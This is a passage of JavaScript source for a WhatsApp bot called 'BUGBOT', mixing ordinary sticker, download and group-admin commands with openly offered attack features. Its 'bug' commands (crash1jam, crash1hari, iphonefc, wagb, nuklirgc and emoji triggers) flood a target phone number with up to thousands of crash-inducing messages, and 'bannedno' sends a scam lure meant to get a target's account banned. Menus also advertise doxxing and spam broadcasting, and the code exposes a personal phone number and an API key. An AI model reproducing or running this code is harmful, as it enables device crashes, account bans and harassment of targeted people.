bot ni ya hunter contact him ndyo hii number yake +254722695736
╰────────────⊱

╭──「 *THIS MENU* ]─⊱
│⍨ doxxing nik
│⍨ getnik
╰────────────⊱`
dimzzxoffc.sendButton(from,  hohe, m, {
body: ewe,
footer: `Powered by DimzzX`
})
break
case 'tempbanmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'DIMZZX','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY DIMZZX','description':'SkyzOfficial','id':'.bugmenu'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@SkyzENZO",
      merchant_url: "https://www.youtube.com/@SkyzENZO"
   })
}
]
ewe = `╭──「 INFO BOTZ  ]─⊱
│⍨ Botz Name : BUGBOT
│⍨ Creator : HUNTER
│⍨ Telegram : @Admin
│⍨ Version : V1.1.17
│⍨ Prefix : Multi-Prefix
bot ni ya hunter contact him ndyo hii number yake +254722695736
╰────────────⊱

╭──「 *THIS MENU* ]─⊱
│⍨ tempban *62|8xxx*
╰────────────⊱`
dimzzxoffc.sendButton(from,  hohe, m, {
body: ewe,
footer: `Powered by DimzzX`
})
break
// BUG MENU
case 'bugmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'DIMZZX','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY DIMZZX','description':'Telegram: @dimzzxoffcvro','id':'.bugmenu'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@SkyzENZO",
      merchant_url: "https://www.youtube.com/@SkyzENZO"
   })
}
]
ewe = `╭──「 INFO BOTZ  ]─⊱
│⍨ Botz Name : BUGBOT
│⍨ Creator : HUNTER
│⍨ Telegram : @Admin
│⍨ Version : V1.1.17
│⍨ Prefix : Multi-Prefix
bot ni ya hunter contact him ndyo hii number yake +254722695736
╰────────────⊱
╭──「 *BUG CRASH* ]─⊱
│⍨ crash1jam *+628xxx*
│⍨ crash1hari *+628xxx*
╰────────────⊱

╭──「 *BUG IPHONE* ]─⊱
│⍨ iphonefc 628xxx
│⍨ ip-bug 628xxx
╰────────────⊱

╭──「 *BUG WHATSAPP* ]─⊱
│⍨ wabusinnes 628xxx
│⍨ wagb 628xxx
│⍨ waori 628xxx
╰────────────⊱

╭──「 *BUG ANDRO* ]─⊱
│⍨ androidcrash 628xxx,1
╰────────────⊱

╭──「 *BUG PC* ]─⊱
│⍨ 🌹 jumlah
│⍨ 🗿 jumlah
│⍨ halobang jumlah
│⍨ permisi jumlah
╰────────────⊱

╭──「 *BUG EMOJI* ]─⊱
│⍨ 🤓 628xxxX
│⍨ ☠️ 628xxxX
│⍨ 💔 628xxxX
│⍨ 😜 628xxxX
╰────────────⊱

╭──「 *BUG GC* ]─⊱
│⍨ nuklirgc *linkgrup*
│⍨ waganasgc *linkgrup*
╰────────────⊱

*JIKA ADA BUG YANG KURANG WORK MAKLUMI SC INI DALAM TAHAPAN*
`
dimzzxoffc.sendButton(from,  hohe, m, {
body: ewe,
footer: `Powered by hunter`
})
break
case 'ownermenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'DIMZZX','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY DIMZZX','description':'Telegram: @dimzzxoffcvro','id':'.bugmenu'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@SkyzENZO",
      merchant_url: "https://www.youtube.com/@SkyzENZO"
   })
}
]
ewe = `╭──「 INFO BOTZ  ]─⊱
│⍨ Botz Name : BUGBOT
│⍨ Creator : HUNTER
│⍨ Telegram : @Admin
│⍨ Version : V1.1.17
│⍨ Prefix : Multi-Prefix
bot ni ya hunter contact him ndyo hii number yake +254722695736
╰────────────⊱
 
┏❐   \`Bot Fitur\` 
┃
self 
public 
setppbot
setppbot /full
┃
┗❐

┏❐   \`List Fitur Akses\` 
┃
adduser 62xxx
delluser 62xxx
listuser
┃
┗❐`
dimzzxoffc.sendButton(from,  hohe, m, {
body: ewe,
footer: `dimzzxoffc`
})
break
// SOUND MENU
case 'soundmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'DIMZZX','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY DIMZZX','description':'Telegram: @dimzzxoffcvro','id':'.bugmenu'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@SkyzENZO",
      merchant_url: "https://www.youtube.com/@SkyzENZO"
   })
}
]
ewe = `╭──「 INFO BOTZ  ]─⊱
│⍨ Botz Name : BUGBOT
│⍨ Creator : HUNTER
│⍨ Telegram : @Admin
│⍨ Version : V1.1.17
│⍨ Prefix : Multi-Prefix
bot ni ya hunter contact him ndyo hii number yake +254722695736
╰────────────⊱

╭──「 *THIS MENU* ]─⊱
│⍨ sound1
│⍨ sound2
│⍨ sound3
│⍨ sound4
│⍨ sound5
│⍨ sound6
│⍨ sound7
│⍨ sound8
│⍨ sound9
│⍨ sound10
│⍨ sound11
│⍨ sound12
│⍨ sound13
│⍨ sound14
│⍨ sound15
│⍨ sound16
│⍨ sound17
│⍨ sound18
│⍨ sound19
│⍨ sound20
┗❐`
dimzzxoffc.sendButton(from,  hohe, m, {
body: ewe,
footer: `dimzzxoffc`
})
break
// GROUP MENU
case 'groupmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'DIMZZX','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY DIMZZX','description':'Telegram: @dimzzxoffcvro','id':'.bugmenu'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@SkyzENZO",
      merchant_url: "https://www.youtube.com/@SkyzENZO"
   })
}
]
ewe = `╭──「 INFO BOTZ  ]─⊱
│⍨ Botz Name : BUGBOT
│⍨ Creator : HUNTER
│⍨ Telegram : @Admin
│⍨ Version : V1.1.17
│⍨ Prefix : Multi-Prefix
bot ni ya hunter contact him ndyo hii number yake +254722695736
╰────────────⊱
 
╭──「 *THIS MENU* ]─⊱
│⍨ pushkontak *text*
│⍨ bcgroup *text*
│⍨ hidetag *text*
│⍨ editsubjek *text*
│⍨ editdesk *text*
│⍨ inspect *link gc*
│⍨ add *62xxx*
│⍨ kick *62xxx*
│⍨ promote *62xxx*
│⍨ demote *62xxx*
│⍨ linkgroup
│⍨ resetlinkgc
╰────────────⊱`
dimzzxoffc.sendButton(from,  hohe, m, {
body: ewe,
footer: `dimzzxoffc`
})
break
// STICKER MENU
case 'stickermenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'DIMZZX','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY DIMZZX','description':'Telegram: @dimzzxoffcvro','id':'.bugmenu'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@SkyzENZO",
      merchant_url: "https://www.youtube.com/@SkyzENZO"
   })
}
]
ewe = `╭──「 INFO BOTZ  ]─⊱
│⍨ Botz Name : BUGBOT
│⍨ Creator : HUNTER
│⍨ Telegram : @Admin
│⍨ Version : V1.1.17
│⍨ Prefix : Multi-Prefix
bot ni ya hunter contact him ndyo hii number yake +254722695736
╰────────────⊱

┏❐   \`List Fitur Sticker\` 
│⍨ attp *text*
│⍨ sticker
│⍨ smeme
┗❐`
dimzzxoffc.sendButton(from,  hohe, m, {
body: ewe,
footer: `dimzzxoffc`
})
break
// DOWNLOAD MENU
case 'downloadmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'DIMZZX','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY DIMZZX','description':'Telegram: @dimzzxoffcvro','id':'.bugmenu'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@SkyzENZO",
      merchant_url: "https://www.youtube.com/@SkyzENZO"
   })
}
]
ewe = `╭──「 INFO BOTZ  ]─⊱
│⍨ Botz Name : BUGBOT
│⍨ Creator : HUNTER
│⍨ Telegram : @Admin
│⍨ Version : V1.1.17
│⍨ Prefix : Multi-Prefix
bot ni ya hunter contact him ndyo hii number yake +254722695736
╰────────────⊱

╭──「 *THIS MENU* ]─⊱
│⍨ tiktokmp4 *link*
│⍨ tiktokmp3 *link*
│⍨ ytmp3 *link*
│⍨ startytmp3 *judul*
│⍨ yts *judul*
│⍨ tourl *reply media*
│⍨ style *teks*
│⍨ fliptext *teks*
╰────────────⊱`
dimzzxoffc.sendButton(from,  hohe, m, {
body: ewe,
footer: `dimzzxoffc`
})
break
// TOOLS MENU
case 'toolsmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'DIMZZX','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY DIMZZX','description':'Telegram: @dimzzxoffcvro','id':'.bugmenu'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@SkyzENZO",
      merchant_url: "https://www.youtube.com/@SkyzENZO"
   })
}
]
ewe = `╭──「 INFO BOTZ  ]─⊱
│⍨ Botz Name : BUGBOT
│⍨ Creator : HUNTER
│⍨ Telegram : @Admin
│⍨ Version : V1.1.17
│⍨ Prefix : Multi-Prefix
bot ni ya hunter contact him ndyo hii number yake +254722695736
╰────────────⊱

╭──「 *THIS MENU* ]─⊱
│⍨ style *teks*
│⍨ fliptext *teks*
│⍨ tourl *reply media*
╰────────────⊱`
dimzzxoffc.sendButton(from,  hohe, m, {
body: ewe,
footer: `dimzzxoffc`
})
break
// CASE LAINNYA
case 'bugpayment':
if (!isCreator) return m.reply(global.nocreator)
var messa = await prepareWAMessageMedia({ image: imagevirtex }, { upload: dimzzxoffc.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendeqtextMessage": {
"text": `𓁿 •dimzzxoffc OFFICIAL• 𓁿`,
}
}}), { userJid: from, quoted: m})
dimzzxoffc.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
break

case 'adduser':
if (!isCreator) return m.reply(global.nocreator)
if (!args[0]) return m.reply(`Use ${prefix+command} Number\nExample ${prefix+command} 6287729157529`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await dimzzxoffc.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Enter a valid number and register on WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./lib/user.json', JSON.stringify(owner))
m.reply(`Number ${bnnd} Has Been Added to Premium!!!`)
break

case 'delluser':
if (!isCreator) return m.reply(global.nocreator)
if (!args[0]) return m.reply(`Use ${prefix+command} Number\nExample ${prefix+command} 6287729157529`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
owner.splice(unp, 1)
fs.writeFileSync('./lib/user.json', JSON.stringify(owner))
m.reply(`Number ${yaki} Has Been Removed From Premium!!!`)
break

case 'listuser':
if (!isCreator) return m.reply(global.nocreator)
teksooo = '*List User Vip*\n\n'
for (let i of owner) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${owner.length}*`
dimzzxoffc.sendMessage(from, { text: teksooo.trim() }, 'extendeqtextMessage', { quoted:m, contextInfo: { "mentionedJid": owner } })
break

case 'sound1': case 'sound2': case 'sound3': case 'sound4': case 'sound5': case 'sound6': case 'sound7': case 'sound8': case 'sound9': case 'sound10': case 'sound11': case 'sound12': case 'sound13': case 'sound14': case 'sound15': case 'sound16': case 'sound17': case 'sound18': case 'sound19': case 'sound20':
await loading()
 dimzzxoffcganteng = await getBuffer(`https://github.com/Sammysaam/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await dimzzxoffc.sendMessage(from, { audio: dimzzxoffcganteng, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6287729157529',
title: `dimzzxoffc`,
sourceUrl: `https://wa.me/6287729157529`, 
thumbnail: imagevirtex
}
}})
break

case 'pushkontak':{
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!qtext) return m.reply(global.notext)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
m.reply(`*Send a message to ${mem.length} people, time is over ${mem.length * 3} second*`)
for (let geek of mem) {
await sleep(5000)
dimzzxoffc.sendMessage(geek, {text: `${teksnye}`}, {quoted:m})
}
m.reply(`*Successfully sent message To ${mem.length} person*`)
}
break

case 'bcgroup': {
if (!isCreator) return m.reply(global.nocreator)
if (!qtext) return m.reply(global.notext)
await loading()
let getGroups = await dimzzxoffc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
for (let i of anu) {
await sleep(1500)
dimzzxoffc.sendMessage(i, {text: `${qtext}`}, {quoted:m})
    }
m.reply(`Successfully Sending Broadcast To ${anu.length} Group`)
}
break

case 'hidetag': {
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
await loading()
dimzzxoffc.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break

case 'kick': {
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
if (!isAdmins) return m.reply(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dimzzxoffc.groupParticipantsUpdate(from, [users], 'remove')
}
break

case 'add': {
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
if (!isAdmins) return m.reply(global.usernoadmin)
await loading()
let users = m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dimzzxoffc.groupParticipantsUpdate(from, [users], 'add')
}
break

case 'promote': {
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
if (!isAdmins) return m.reply(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dimzzxoffc.groupParticipantsUpdate(from, [users], 'promote')
}
break

case 'demote': {
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
if (!isAdmins) return m.reply(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dimzzxoffc.groupParticipantsUpdate(from, [users], 'demote')
}
break

case 'editsubjek': {
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
if (!isAdmins) return m.reply(global.usernoadmin)
if (!qtext) return m.reply(global.notext)
await loading()
await dimzzxoffc.groupUpdateSubject(from, qtext)
}
break

case 'editdesk':{
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
if (!isAdmins) return m.reply(global.usernoadmin)
if (!qtext) return m.reply(global.notext)
await loading()
await dimzzxoffc.groupUpdateDescription(from, qtext)
}
break

case 'linkgroup': case 'linkgc': {
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
await loading()
let responsegg = await dimzzxoffc.groupInviteCode(from)
dimzzxoffc.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!isCreator) return m.reply(global.nocreator)
if (!m.isGroup) return m.reply(global.noingroup)
if (!isBotAdmins) return m.reply(global.nobotadmin)
await loading()
dimzzxoffc.groupRevokeInvite(from)
break

case 'public': {
if (!isCreator) return m.reply(global.nocreator)
dimzzxoffc.public = true
m.reply('Sukse Change To Public')
}
break

case 'self': {
if (!isCreator) return m.reply(global.nocreator)
dimzzxoffc.public = false
m.reply('Sukse Change To Self')
}
break

case 'infobot':
infobot = {
image: imagevirtex,
caption: `*Hallo ${pushname}*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*INFO CREATOR AND BOT*
Creator: dimzzxoffc
Youtube: https://www.youtube.com/@SkyzENZO
Base: SkyzOfficial
Versi Bot: V5
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

*SCRIPT DEVELOPED BY hunter OFFICIAL*`
}
dimzzxoffc.sendMessage(from, infobot)
break

case 'sticker':
 if (!quoted) return m.reply(`Reply to Video/Image With Caption ${prefix + command}`)
if (/image/.test(mime)) {
await loading()
let media = await quoted.download()
let encmedia = await dimzzxoffc.sendImageAsSticker(from, media, m, { packname: global.sticker1, author: global.sticker2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maximum 10 seconds!')
let media = await quoted.download()
let encmedia = await dimzzxoffc.sendVideoAsSticker(from, media, m, { packname: global.sticker1, author: global.sticker2 })
await fs.unlinkSync(encmedia)
} else {
return m.reply(`Send Images/Videos With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
break

case 'attp':
if (args.length == 0) return m.reply(global.notext)
await loading()
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
dimzzxoffc.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
break

case 'smeme':
if (!qtext) return m.reply(global.notext)
if (!quoted) throw `Reply to Image With Caption ${prefix + command}`
if (/image/.test(mime)) {
await loading()
mee = await dimzzxoffc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${qtext}.png?background=${mem}`)
dimzzxoffc.sendImageAsSticker(from, kaytid, m, { packname: global.sticker1, author: global.sticker2 })
}
break

case 'tiktokmp4':{
if (!qtext) return m.reply( `Example : ${prefix + command} link`)
linkRegexx = args.join(" ")
codedd = linkRegexx.split("https://vt.tiktok.com/")[1]
if (!codedd) return replyy("Link Invalid")
await loading()
require('./lib/tiktok').Tiktok(q).then( data => {
dimzzxoffc.sendMessage(from, { caption: `dimzzxoffc Official!`, video: { url: data.watermark }}, {quoted:m})
})}
break

case 'inspect': case 'getidgrup': {
if (!isCreator) return m.reply(global.nocreator)
if (!qtext) return m.reply('Link?')
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return replyy("Link Invalid")
dimzzxoffc.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`
replyy(tekse)
})}
break

case 'tiktokmp3':{
if (!qtext) return m.reply( `Example : ${prefix + command} link`)
linkRegexx = args.join(" ")
codedd = linkRegexx.split("https://vt.tiktok.com/")[1]
if (!codedd) return replyy("Link Invalid")
await loading()
require('./lib/tiktok').Tiktok(q).then( data => {
dimzzxoffc.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break

case 'startytmp3':{
if (!q) return replyy(`Example : ${prefix + command} karna su sayang`)
const dimzzxoffcplay = require('./lib/ytdl2')
const { fetchBuffer } = require("./lib/storage2")
let yts = require("youtube-yts")
let search = await yts(q)
let anup3k = search.videos[0]
const pl= await dimzzxoffcplay.mp3(anup3k.url)
await dimzzxoffc.sendMessage(from,{
audio: fs.readFileSync(pl.path),
fileName: anup3k.title + '.mp3',
mimetype: 'audio/mp4', ptt: true,
contextInfo:{
externalAdReply:{
title:anup3k.title,
body: `dimzzxoffc Official`,
thumbnail: await fetchBuffer(pl.meta.image),
mediaType:2,
mediaUrl:anup3k.url,
}

},
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break

case 'yts': case 'ytsearch': {
if (!q) return replyy(`Example : ${prefix + command} story wa anime`)
yts = require("yt-search")
search = await yts(q)
nyaabanaayts = 'YouTube Search\n\n Result From '+q+'\n\n'
no = 1
for (let i of search.all) {
hasilpencarian = `${nyaabanaayts}\nNo : ${no++}\n Type : ${i.type}\n Video ID : ${i.videoId}\n Title : ${i.title}\n Views : ${i.views}\n Duration : ${i.timestamp}\n Uploaded : ${i.ago}\n Url : ${i.url}\n\n─────────────────\n\n`
}
dimzzxoffc.sendMessage(from, { image: { url: search.all[0].thumbnail },  caption: hasilpencarian }, { quoted: m })
}
break

case 'style': case 'styletext': {
let { styletext } = require('./lib/scraper')
if (!q) return replyy('Enter Query text!')
let anu = await styletext(q)
let teks = `Style Text From ${q}\n\n`
for (let i of anu) {
teks += `*${i.name}* : ${i.result}\n\n`
}
replyy(teks)
}
break

case 'fliptext': {
if (args.length < 1) return replyy(`Example:\n${prefix}fliptext dimzzxoffc`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replyy(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break

case 'setppbot': case 'setbotpp': {
if (!isCreator) return m.reply(global.nocreator)
if (!quoted) return replyy(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replyy(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replyy(`Send/Reply Image With Caption ${prefix + command}`)
var medis = await dimzzxoffc.downloadAndSaveMediaMessage(quoted)
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await dimzzxoffc.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replyy(`Success`)
} else {
var memeg = await dimzzxoffc.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replyy(`Success`)
}
}
break

case 'ytmp3': case 'youtubemp3': {
if (!isCreator) return m.reply('*.*')
if (!q) return m.reply(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%2`)
await loading()
downloadMp3(q)
}
break

case 'cek?': {
m.reply('Bot Ready to Use 🤗')
}
break

case 'tourl': {
if (!isCreator) return m.reply(global.nocreator)
if (!quoted) return replyy(`Reply Media`)
replyy('*please wait a moment*')
let media = await dimzzxoffc.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
anuh = await TelegraPh(media)
replyy(util.format(anuh))
} else if (/video/.test(mime)) {
anuh = await TelegraPh(media)
replyy(util.format(anuh))
} else if (!/image/.test(mime)) {
anuh = await UploadFileUgu(media)
replyy(util.format(anuh))
}
await fs.unlinkSync(media)       
}
break

case 'crash1jam':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Insert Target number')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 900
sendMultipleTypesOfMessages(Pe, jumlah)
await sleep(2000)
m.reply(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes`)
break

case 'crash1hari':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 21600
sendMultipleTypesOfMessages(Pe, jumlah)
await sleep(2000)
m.reply(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes`)
break


case 'bannedno':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply(' Enter the Target number Prefix "+" and Country Code')
await dimzzxoffc.sendMessage(from, {text: `اربح المال بسهولة عبر الإنترنت لمدة ساعة واحدة بسعر 10 آلاف💰.\nفقط في هذا الاستبيان، قم بتسجيل حسابك على الفور، ما عليك سوى رقم واتساب جاهز للاتصال بالإنترنت 🤑.\nلا تفوت هذه الفرصة، سجل الآن باستخدام رمز QR 📄\n\nقم بالرد بـ "1" وانقر على الرابط أدناه 👇\nhttps://server.go-share.top/\n\nوتواصل مع WhatsApp الخاص بي إذا كنت ترغب في الحصول على مكافأة!!🎁\nhttps://api.whatsapp.com/send?phone=${q}`},{quoted: m})
sleep(2000)
m.reply(`👆  teks di atas lalu centang Nomor target 👆\n\n\n ⚠️ Peringatan : tidak semua nomor bisa di banned`)
break

case '🤓':
case '☠️':
case '💔':
case '😜':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 50
sendMultipleTypesOfMessages(Pe, jumlah)
await sleep(2000)
bugxbutton(from, jumlah)
await sleep(2000)
m.reply(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes`)
break

case '🌹':
case '😱':
case 'halobang':
case 'permisi':
if (!isCreator) return replyy(global.nocreator)

jumlah = 20
bugxbutton(from, jumlah)
await sleep(1000)
sendMultiLocationMessages(from, jumlah)
await sleep(2000)
replyy(`*Successfully sent a bug. Please pause for 3 minutes*`)
break

case 'ip-bug':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 20
sendAlternatingMessages(Pe, jumlah)
await sleep(2000)
m.reply(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes`)
break

case 'waori':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 20
sendMultipleTypesOfMessages(Pe, jumlah)
await sleep(1000)
bugxbutton(Pe, jumlah)
await sleep(2000)
m.reply(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes`)
break

case 'wagb':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 20
sendMultipleTypesOfMessages(Pe, jumlah)
await sleep(2000)
sendMultiLocationMessages(Pe, jumlah)
await sleep(2000)
bugxbutton(Pe, jumlah)
await sleep(2000)
m.reply(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes`)
break

case 'waganasgc':
case 'nuklirgc':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 50
sendRepeatedMessages(Pe, jumlah)
sendRepeatedMessages(Pe, jumlah)
await sleep(2000)
m.reply(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes`)
break

case 'wabusinnes':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 20
sendMultiLocationMessages(Pe, jumlah)
await sleep(2000)
sendMultipleTypesOfMessages(Pe, jumlah)
await sleep(2000)
bugxbutton(Pe, jumlah)
await sleep(2000)
sendMultiLocationMessages(Pe, jumlah)
await sleep(2000)
m.reply(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes`)
break

case 'iphonefc':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 10
sendAlternatingMessages(Pe, jumlah)
await sleep(2000)
m.reply(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes`)
break

case 'tempban': {
if (!isCreator) return m.reply(global.nocreator)
